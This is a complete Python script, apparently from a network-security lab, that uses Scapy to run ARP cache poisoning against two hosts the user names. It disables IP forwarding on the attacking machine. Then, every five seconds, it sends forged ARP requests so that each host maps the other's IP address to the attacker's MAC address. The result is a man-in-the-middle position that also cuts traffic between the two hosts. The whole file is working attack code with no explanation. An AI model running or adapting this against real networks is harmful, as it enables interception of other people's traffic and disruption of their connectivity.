#!/usr/bin/env python3
from scapy.all import *
from time import  *
import os
from getmac import get_mac_address

IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

IP_A = input('Please enter the IP address of the Host A Machine: ')
MAC_A = get_mac_address(ip=IP_A)
IP_B = input('Please enter th IP address of the Host B Machine: ')
MAC_B = get_mac_address(ip=IP_B)

print ('\t\t\nPoisoning Host A & Host B! .. ')
os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

# Constructing spoofed ARP request to Host A
ether1 = Ether()
ether1.dst = MAC_A
arp1 = ARP()
arp1.psrc = IP_B
arp1.hwsrc = MAC_M
arp1.pdst  = IP_A
arp1.op = 1 
frame1 = ether1/arp1

# Constructing spoofed ARP request to Host B
ether2 = Ether()
ether2.dst = MAC_B
arp2 = ARP()
arp2.psrc = IP_A
arp2.hwsrc = MAC_M
arp2.pdst  = IP_B
arp2.op = 1 
frame2 = ether2/arp2

while 1:
   print("Sending spoofed ARP request to Hosts A and B")
   sendp(frame1)
   sendp(frame2)
   sleep(5)

